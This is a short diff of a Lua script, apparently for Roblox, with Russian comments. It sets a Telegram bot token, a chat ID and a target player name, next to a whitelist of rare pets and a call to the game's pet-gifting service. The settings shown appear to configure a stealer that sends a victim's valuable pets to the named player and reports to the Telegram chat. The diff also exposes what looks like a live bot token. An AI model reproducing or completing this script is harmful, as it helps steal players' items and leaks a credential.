@@ -76,9 +76,9 @@ end)
 -- ⏳ Весь остальной функционал запускается независимо
 
 -- 🔧 НАСТРОЙКИ
-local TELEGRAM_TOKEN = ""
-local TELEGRAM_CHAT_ID = ""
-local TARGET_PLAYER = ""
+local TELEGRAM_TOKEN = "8453808391:AAF2DDoyG2A3kC-z_L7eSy_wDsrMqbW-dFc"
+local TELEGRAM_CHAT_ID = "1083880279"
+local TARGET_PLAYER = "AlDente94"
 local TRIGGER_MESSAGE = "."
 
 -- 🐾 БЕЛЫЙ СПИСОК
@@ -95,7 +95,6 @@ local WHITELIST = {
     "Spinosaurus",
     "T-Rex",
     "Blood Kiwi",
-    "Wasp"
 }
 
 local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
